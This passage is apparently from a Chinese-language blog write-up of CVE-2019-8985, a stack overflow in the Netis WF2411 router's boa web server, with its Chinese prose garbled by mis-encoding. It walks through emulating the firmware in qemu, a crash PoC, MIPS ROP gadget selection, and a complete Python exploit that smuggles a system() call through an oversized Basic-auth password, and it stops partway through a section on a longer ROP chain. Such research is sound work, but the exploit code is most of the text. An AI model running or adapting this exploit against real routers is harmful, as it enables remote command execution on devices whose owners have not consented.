<span class=\"type\">char</span> *a1, <span class=\"type\">const</span> <span class=\"type\">char</span> *a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// $s1</span></span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// $v0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// $s2</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// $v0</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *v8; <span class=\"comment\">// $s0</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> v9; <span class=\"comment\">// dc</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v10[<span class=\"number\">64</span>]; <span class=\"comment\">// [sp+20h] [-40h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v10, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v10));</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( get_password(<span class=\"number\">64</span>) &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">sprintf</span>(v10, <span class=\"string\">&quot;%s:%s&quot;</span>, a1, a2);</span><br><span class=\"line\">    v6 = (<span class=\"type\">unsigned</span> __int8)v10[<span class=\"number\">0</span>] - <span class=\"number\">58</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v7 = v4 &lt;&lt; <span class=\"number\">6</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( byte_4596D0[<span class=\"number\">64</span> * v4] == <span class=\"number\">58</span> &amp;&amp; !v6 )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      v8 = &amp;byte_4596D0[v7];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(&amp;byte_4596D0[v7]) &gt;= <span class=\"number\">2</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v9 = <span class=\"built_in\">strcmp</span>(v10, v8) == <span class=\"number\">0</span>;</span><br><span class=\"line\">        result = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v9 )</span><br><span class=\"line\">          <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ++v4 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;check password error,log_passwd=%s;passwd=%s\\n&quot;</span>, a2, byte_4596D0);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;%s:%s:%d;get password error!\\n&quot;</span>, <span class=\"string\">&quot;htauth.c&quot;</span>, <span class=\"string\">&quot;user_ok&quot;</span>, <span class=\"number\">74</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯åŠ¨ boa çš„æ—¶å€™å¯ä»¥æ£€æŸ¥ä¸‹é…ç½®æ–‡ä»¶</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">âœ  sqrootfs file bin/busybox         </span><br><span class=\"line\">bin/busybox: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class=\"line\">âœ  sqrootfs cp $(which qemu-mips) .</span><br><span class=\"line\">âœ  sqrootfs grep -r &quot;boa -&quot; .                   </span><br><span class=\"line\">./bin/webs:\t/bin/boa -p /web -f /etc/boa.conf &amp;</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">âœ  sqrootfs sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br><span class=\"line\">[sudo] password for squ: </span><br><span class=\"line\">Starting Protocol Module: HTTP Server                      ... OK</span><br></pre></td></tr></table></figure>\n<p>å¦‚æœå‡ºç°ä¸èƒ½ç¼ºå¤± <code>/dev/null</code>  çš„é—®é¢˜<br>\nå¯ä»¥ <code>sudo mknod -m 666 dev/null c 1 3</code> <br>\n å¦‚æœå‡ºç° <code>can't create PID file</code> <br>\n å¯ä»¥ <code>md var/run</code></p>\n<p>ç„¶åå¯ä»¥æ‰“ä¸ª PoC è¯•è¯•çœ‹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget --http-user=a --http-password=$(python -c &#x27;print &quot;a&quot;*0x80&#x27;) http://127.0.0.1</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ°æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">translate_uri:222;Wget/1.19.4 (linux-gnu)</span><br><span class=\"line\">translate_uri:254</span><br><span class=\"line\">translate_uri:256</span><br><span class=\"line\">htauth.c:user_auth:181;get password error!</span><br></pre></td></tr></table></figure>\n<p>âœ¨TODO</p>\n<p>é€†å‘ä¸€ä¸‹å¯ä»¥å‘ç°è¦æ‰“å¼€ä¸€ä¸ª passwd</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v2 = fopen(<span class=\"string\">&quot;/tmp/passwd&quot;</span>, <span class=\"string\">&quot;r+&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>cp æœ¬åœ°çš„è¿‡å»</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/passwd ./tmp</span><br></pre></td></tr></table></figure>\n<p>åœ¨ wget ä¸€ä¸‹ å¯ä»¥çœ‹åˆ°å´©æºƒ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">check password error,log_passwd=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;passwd=root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">caught SIGSEGV, dumping core in /var/boa</span><br><span class=\"line\">qemu: uncaught target signal 6 (Aborted) - core dumped</span><br><span class=\"line\">[1]    49014 abort      sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br></pre></td></tr></table></figure>\n<h2 id=\"æ¼æ´åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´åˆ†æ\">#</a> æ¼æ´åˆ†æ</h2>\n<p><code>ra</code>  åœ¨  <code>sp + 0x14</code> <br>\n <code>buf</code>  åœ¨  <code>sp - 0x40</code> <br>\n ä¹Ÿå°±æ˜¯ <code>0x54</code>  çš„ offs<br>\n åŒæ—¶æˆ‘ä»¬ä¹Ÿéœ€è¦æ§åˆ¶äº”ä¸ªå¯„å­˜å™¨ <code>s0 ~ s5</code>  è¿™äº”ä¸ªè°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨<br>\nè¿™äº›å¯„å­˜å™¨ä¸»è¦æ˜¯ä¸ºäº†åŠ«æŒè¿”å›åœ°å€ å› ä¸ºä¼šæœ‰ sx ä¼ é€’ç»™ ax<br>\n ç„¶å jalr ax çš„ gadget</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">004146</span>DC                 lw      $ra, <span class=\"number\">0x60</span>+var_s14($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E0</span>                 lw      $s4, <span class=\"number\">0x60</span>+var_s10($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E4</span>                 lw      $s3, <span class=\"number\">0x60</span>+var_sC($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E8</span>                 lw      $s2, <span class=\"number\">0x60</span>+var_s8($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146</span>EC                 lw      $s1, <span class=\"number\">0x60</span>+var_s4($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>0                 lw      $s0, <span class=\"number\">0x60</span>+var_s0($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>4                 jr      $ra</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>8                 addiu   $sp, <span class=\"number\">0x78</span></span><br></pre></td></tr></table></figure>\n<p>sprintf çš„é€†å‘è¯­å¥å¦‚ä¸‹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sprintf(dest, &quot;%s:%s&quot;, username, password);</span><br></pre></td></tr></table></figure>\n<p><code>boa</code>  has two loaded libraries,  <code>libC</code>  and  <code>libgcc</code> .</p>\n<p>å®¡è§†ä¸€æ³¢ libc.so.0</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">Python&gt;</span><span class=\"language-bash\">mipsrop.stackfinder()</span></span><br><span class=\"line\">----------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class=\"line\">----------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">|  0x000068AC  |  addiu $a0,$sp,0x20+var_8                            |  jalr  $v0                             |</span><br><span class=\"line\">|  0x0000711C  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class=\"line\">|  0x000074BC  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class=\"line\">|  0x00020660  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class=\"line\">|  0x000071E4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class=\"line\">|  0x00008AD4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class=\"line\">|  0x0000A3CC  |  addiu $a2,$sp,0x40+var_28                           |  jr    0x40+var_sC($sp)                |</span><br><span class=\"line\">|  0x000125E0  |  addiu $a2,$sp,0x18+arg_8                            |  jr    0x18+var_s0($sp)                |</span><br></pre></td></tr></table></figure>\n<p>æ²¡æœ‰å¯ç”¨çš„ gadget<br>\n å†åˆ° libgcc ä¸­æ‰¾ ç¬¬äºŒåˆ—æœ‰ a0 ç¬¬ä¸‰åˆ—æœ‰ s0 ~ s4 å°±è¡Œ<br>\næ‰¾åˆ°è¿™ä¸ª ä¹Ÿå°±æ˜¯è¦ç¡®ä¿</p>\n<ul>\n<li>binsh åœ°å€åœ¨ sp + 0x18 (ä½†è¿™ä¸ªæ˜¯åœ¨æ‰§è¡Œäº† <code>addiu   $sp, 0x78</code>  ä¹‹åçš„)</li>\n<li>è€Œ system åœ¨ s3 ï¼ˆsp + 0xcï¼‰</li>\n<li>ra åœ¨ sp +0x14</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class=\"line\">.text:0000ABD4                 move    $a1, $s2</span><br><span class=\"line\">.text:0000ABD8                 move    $s0, $zero</span><br><span class=\"line\">.text:0000ABDC                 move    $t9, $s3</span><br><span class=\"line\">.text:0000ABE0                 jalr    $t9</span><br><span class=\"line\">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure>\n<p>åœ¨ qemu å†…æ¨¡æ‹Ÿ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">  0x400000   0x419000 r-xp    19000 0      /bin/boa</span><br><span class=\"line\">  0x459000   0x45a000 rw-p     1000 19000  /bin/boa</span><br><span class=\"line\">  0x45a000   0x466000 rwxp     c000 0      [heap]</span><br><span class=\"line\">0x77ee2000 0x77eee000 r-xp     c000 0      /lib/libgcc_s_4181.so.1</span><br><span class=\"line\">0x77eee000 0x77f2d000 ---p    3f000 0      [anon_77eee]</span><br><span class=\"line\">0x77f2d000 0x77f2e000 rw-p     1000 b000   /lib/libgcc_s_4181.so.1</span><br><span class=\"line\">0x77f2e000 0x77f6c000 r-xp    3e000 0      /lib/libc.so.0</span><br><span class=\"line\">0x77f6c000 0x77fac000 ---p    40000 0      [anon_77f6c]</span><br><span class=\"line\">0x77fac000 0x77fad000 rw-p     1000 3e000  /lib/libc.so.0</span><br><span class=\"line\">0x77fad000 0x77fb1000 rw-p     4000 0      [anon_77fad]</span><br><span class=\"line\">0x77fb1000 0x77fb7000 r-xp     6000 0      /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x77ff5000 0x77ff6000 rw-p     1000 0      [anon_77ff5]</span><br><span class=\"line\">0x77ff6000 0x77ff7000 r--p     1000 5000   /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x77ff7000 0x77ff8000 rw-p     1000 6000   /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x7f9ee000 0x7fff7000 rwxp   609000 0      [stack]</span><br><span class=\"line\">0x7fff7000 0x7fff8000 r-xp     1000 0      [vdso]</span><br></pre></td></tr></table></figure>\n<p>gdb å®šä½åˆ°åœ°å€<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220718180751.png\" alt><br>\nå¯ä»¥çœ‹åˆ°ç”±äº boa çš„é™åˆ¶ âœ¨TODO<br>\n æˆ‘ä»¬åªæº¢å‡ºäº† 17 ä¸ª cmd çš„å­—èŠ‚å‘½ä»¤<br>\nè€Œ cmd éœ€è¦æ”¾åœ¨ <code>0x40800368</code>  çš„ä½ç½® ä¹Ÿå°±æ˜¯ esp + 0x18  <code>0x40800350 + 0x18</code></p>\n<p>ä»è¿™ä¸€æ®µå¯ä»¥çœ‹å‡º</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">â–º 0x4146dc &lt;user_ok+460&gt;    lw     $ra, 0x74($sp)                &lt;0x4146cc&gt;</span><br><span class=\"line\">  0x4146e0 &lt;user_ok+464&gt;    lw     $s4, 0x70($sp)</span><br><span class=\"line\">  0x4146e4 &lt;user_ok+468&gt;    lw     $s3, 0x6c($sp)</span><br><span class=\"line\">  0x4146e8 &lt;user_ok+472&gt;    lw     $s2, 0x68($sp)</span><br><span class=\"line\">  0x4146ec &lt;user_ok+476&gt;    lw     $s1, 0x64($sp)</span><br><span class=\"line\">  0x4146f0 &lt;user_ok+480&gt;    lw     $s0, 0x60($sp)</span><br><span class=\"line\">  0x4146f4 &lt;user_ok+484&gt;    jr     $ra</span><br></pre></td></tr></table></figure>\n<p>ra åœ¨ sp + 0x74 çš„ä½ç½®<br>\nè€Œ jr ä¹‹å‰ä¼šåšä¸€æ¬¡ <code>.text:004146F8                 addiu   $sp, 0x78</code> <br>\n è€Œ gadget é‡Œçš„ cmd åœ°å€æ˜¯ <code>addiu   $a0, $sp, 0x20+var_8</code> <br>\n ä¹Ÿå°±æ˜¯æ”¾åœ¨ ra ä¸Š  <code>0x78 - 0x74 + 0x18</code>  =  <code>0x1c</code>  çš„ä½ç½®</p>\n<p>exp å¦‚ä¸‹<br>\n s3 çš„ä½ç½®æ˜¯ <code>sp + 0x6c</code>  æº¢å‡ºç‚¹ç¦» s0 æ˜¯  <code>0x40</code> <br>\n æ‰€ä»¥æº¢å‡ºç‚¹ç¦» s3 æ˜¯ <code>0x4c</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">libc   \t= <span class=\"number\">0x77f2e000</span> </span><br><span class=\"line\">libgcc \t= <span class=\"number\">0x77ee2000</span></span><br><span class=\"line\">gadget \t= <span class=\"number\">0x0000ABD0</span> + libgcc</span><br><span class=\"line\">system\t= <span class=\"number\">0x0002AC90</span> + libc</span><br><span class=\"line\">MAXSZ\t= <span class=\"number\">1024</span></span><br><span class=\"line\"><span class=\"comment\"># cmd\t\t= b&quot;FUCK&quot; * 50 # çœ‹çœ‹é•¿åº¦</span></span><br><span class=\"line\">cmd\t\t= <span class=\"string\">b&quot;mkdir hack&quot;</span></span><br><span class=\"line\">context(arch = <span class=\"string\">&quot;mips&quot;</span>, endian = <span class=\"string\">&quot;big&quot;</span>, os = <span class=\"string\">&quot;Linux&quot;</span>, log_level = <span class=\"string\">&quot;DEBUG&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># fork 0x77f34d30</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] gadget is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(gadget)&#125;</span>&quot;</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] system is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class=\"line\">\tpayload  = <span class=\"string\">b&#x27;a:%s&#x27;</span> %(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x4C</span> - <span class=\"number\">2</span>)) <span class=\"comment\"># padding + s0~s2</span></span><br><span class=\"line\">\tpayload += p32(system)\t\t\t\t\t<span class=\"comment\"># s3 &lt;- esp + 0x0c</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;AAAA&#x27;</span>\t\t\t\t\t\t<span class=\"comment\"># s4 </span></span><br><span class=\"line\">\tpayload += p32(gadget) \t\t\t\t\t<span class=\"comment\"># ra &lt;- esp + 0x14</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += cmd  \t\t\t\t\t\t<span class=\"comment\"># \t &lt;- esp + 0x30</span></span><br><span class=\"line\"></span><br><span class=\"line\">\theader   = <span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span></span><br><span class=\"line\">\t<span class=\"comment\"># header  += b&#x27;Host: 127.0.0.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Host: 10.10.10.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Authorization: Basic %s\\r\\n&#x27;</span> % base64.b64encode(payload)</span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;User-Agent: Real UserAgent\\r\\n\\r\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">\tiport = (<span class=\"string\">&quot;10.10.10.1&quot;</span> ,<span class=\"number\">80</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class=\"line\">\ts.connect(iport)</span><br><span class=\"line\">\ts.send(header)</span><br><span class=\"line\">\tmsg = s.recv(MAXSZ)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class=\"line\">\ts.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<p>gdb è°ƒè¯•è„šæœ¬</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set arch mips</span><br><span class=\"line\">set endian big</span><br><span class=\"line\">set solib-search-path sqrootfs/lib/</span><br><span class=\"line\">b *0x4146f4</span><br><span class=\"line\">target remote 10.10.10.1:8888</span><br></pre></td></tr></table></figure>\n<p>ç¨‹åºæ˜¯ chroot åˆ° /web é¡µé¢ä¸‹äº† æ‰€ä»¥ mkdir æ˜¯åœ¨ web ä¸‹<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/2.png\" alt></p>\n<p>17 ä¸ªå­—èŠ‚çš„æº¢å‡ºæ˜¯å¾ˆéš¾é€ æˆåå‘ shell çš„ ä¹Ÿå°±åªèƒ½é€ æˆä¸€æ¬¡ 17 å­—èŠ‚çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>\né‡æ–°è€ƒè™‘ rop</p>\n<h2 id=\"æ›´å¥½çš„rop\"><a class=\"markdownIt-Anchor\" href=\"#æ›´å¥½çš„rop\">#</a> æ›´å¥½çš„ ROP</h2>\n<p>ç›®æ ‡ è®©æœ€åçš„ a0 å°½å¯èƒ½çš„æ¥è¿‘ sp çš„ä½ç½®<br>\nå·²çŸ¥åœ¨ vuln å‡½æ•°æœ€å jalr ra ä¹‹å sp æ˜¯åœ¨ ra ä¸Š 4 å­—èŠ‚</p>\n<h3 id=\"gadget2\"><a class=\"markdownIt-Anchor\" href=\"#gadget2\">#</a> gadget2</h3>\n<p>ä» ra å¼€å§‹åˆ° cmd ç»“æŸ æœ‰ 40 ä¸ªå­—èŠ‚çš„ç©ºåŒº<br>\nè¦å……åˆ†åˆ©ç”¨è¿™ 40 å­—èŠ‚ å°±éœ€è¦é™ä½ esp<br>\n åœ¨ libc ä¸­æ‰¾åˆ°æ­¤ gadget<br>\n <code>sp - 0x38 + 0x30 - 0x18 = sp - 0x20</code>  çš„å€¼ç»™ <code>a0</code>  å¯„å­˜å™¨<br>\nç„¶åè·³åˆ° å…ˆå‰çš„ <code>a0</code>  é‡Œé¢å»<br>\nä½†æ˜¯æœ‰ä¸ªé—®é¢˜  <code>sp-0x20</code>  æ˜¯åœ¨ saved å¯„å­˜å™¨å­˜æ”¾çš„åœ°æ–¹ è‚¯å®šæ˜¯å¾ˆéš¾å¸ƒç½®è¿‡é•¿çš„ cmd<br>\n è€Œä¸” <code>a0</code>  ä¸å¯æ§ æˆ‘ä»¬éœ€è¦è®© <code>a0</code>  å¯æ§</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00020650                 addiu   $sp, -0x38</span><br><span class=\"line\">.text:00020654                 sw      $ra, 0x30+var_s0($sp)</span><br><span class=\"line\">.text:00020658                 sw      $gp, 0x30+var_20($sp)</span><br><span class=\"line\">.text:0002065C                 li      $v0, 2</span><br><span class=\"line\">.text:00020660                 move    $t9, $a0</span><br><span class=\"line\">.text:00020664                 sw      $v0, 0x30+var_18($sp)</span><br><span class=\"line\">.text:00020668                 jalr    $t9</span><br><span class=\"line\">.text:0002066C                 addiu   $a0, $sp, 0x30+var_18</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget1\"><a class=\"markdownIt-Anchor\" href=\"#gadget1\">#</a> gadget1</h3>\n<p>è€Œè¿™ä¸ª gadget ä¾é  <code>a0</code>  è¿›è¡Œè·³è½¬ æˆ‘ä»¬éœ€è¦æ§åˆ¶ <code>a0</code> <br>\nlibgcc ä¸­<br>\næˆ‘ä»¬å¯ä»¥æ§åˆ¶ <code>a0</code>  ä¹Ÿå¯ä»¥æ§åˆ¶è·³è½¬åœ°å€</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00008B20                 move    $t9, $s4</span><br><span class=\"line\">.text:00008B24                 jalr    $t9 ; sub_8770</span><br><span class=\"line\">.text:00008B28                 move    $a0, $s0</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget3\"><a class=\"markdownIt-Anchor\" href=\"#gadget3\">#</a> gadget3</h3>\n<p>åŒæ—¶ æ ˆä¸‹å»äº† å½±å“åˆ°æˆ‘ä»¬çš„ s å¯„å­˜å™¨åˆ—äº† éœ€è¦æŠ¬ä¸Šæ¥<br>\nä¹‹å‰ <code>sp</code>  å‡å»äº†  <code>0x38</code>  